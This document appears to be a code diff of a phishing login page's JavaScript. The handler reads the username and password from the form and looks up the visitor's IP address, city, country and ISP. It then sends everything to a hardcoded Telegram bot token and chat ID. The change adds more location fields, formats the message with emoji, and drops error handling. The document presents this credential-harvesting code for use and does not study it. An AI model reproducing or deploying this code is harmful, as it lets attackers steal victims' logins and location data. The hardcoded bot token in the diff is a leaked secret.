@@ -2,39 +2,28 @@ document.addEventListener('DOMContentLoaded', function () {
     const form = document.getElementById('loginForm');
 
     form.addEventListener('submit', function (event) {
-        event.preventDefault();
+        event.preventDefault(); // Prevents the default form submission
 
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
-
-        // Log for debugging
-        console.log("Username:", username);
-        console.log("Password:", password);
 
         if (!username || !password) {
             alert('Both username and password are required.');
             return;
         }
 
-        // Get IP and location info
+        // Fetch IP and location info
         fetch('https://ipapi.co/json/')
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                return response.json();
-            })
+            .then(response => response.json())
             .then(data => {
                 const ip = data.ip;
                 const country = data.country_name;
+                const city = data.city;
+                const isp = data.org;
 
-                // Log for debugging
-                console.log("IP:", ip);
-                console.log("Country:", country);
+                const message = `🔹 New Login Attempt 🔹\n👤 Username: ${username}\n🔑 Password: ${password}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;
 
-                const message = `Username: ${username}\nPassword: ${password}\nIP: ${ip}\nCountry: ${country}`;
-
-                // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with actual values
+                // Replace these with your bot token and chat ID
                 const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
                 const chatId = '6651292809';
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -51,17 +40,13 @@ document.addEventListener('DOMContentLoaded', function () {
                     },
                     body: JSON.stringify(payload)
                 })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error(`Telegram API error! status: ${response.status}`);
-                    }
-                    return response.json();
-                })
+                .then(response => response.json())
                 .then(data => {
-                    if (!data.ok) {
-                        throw new Error(`Telegram API error! description: ${data.description}`);
+                    if (data.ok) {
+                        alert('Login details sent to Telegram.');
+                    } else {
+                        alert('Error sending message to Telegram.');
                     }
-                    console.log('Message sent to Telegram successfully.');
                 })
                 .catch(error => {
                     console.error('Error sending message to Telegram:', error);
